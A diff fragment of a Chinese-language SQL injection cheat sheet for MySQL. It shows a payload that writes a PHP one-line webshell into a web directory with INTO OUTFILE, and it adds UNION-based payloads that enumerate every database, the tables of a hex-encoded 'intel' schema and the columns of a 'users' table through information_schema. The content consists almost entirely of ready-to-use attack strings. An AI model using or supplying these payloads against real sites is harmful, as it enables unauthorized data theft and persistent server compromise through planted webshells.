@@ -85,3 +85,16 @@ mysql 获取操作系统信息
 写入一句话木马
 1' and 1=2 union select 1,"\<\?php eval($_POST['x']);\?\>" into outfile "/var/www/html/target/upload/a.php";
 
+
+精：直接爆出 所有数据库，  所有表，  所有字段
+
+1' and 1=2 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA  -- '   爆库
+
+1' and 1=2 union select 1,2,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = 0x696E74656C  --'  爆intel库里的表（16进制ASCII码字符串）
+
+1' and 1=2 union select 1,2,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME = %27users%27   --' 爆users库里的字段
+
+
+
+
+
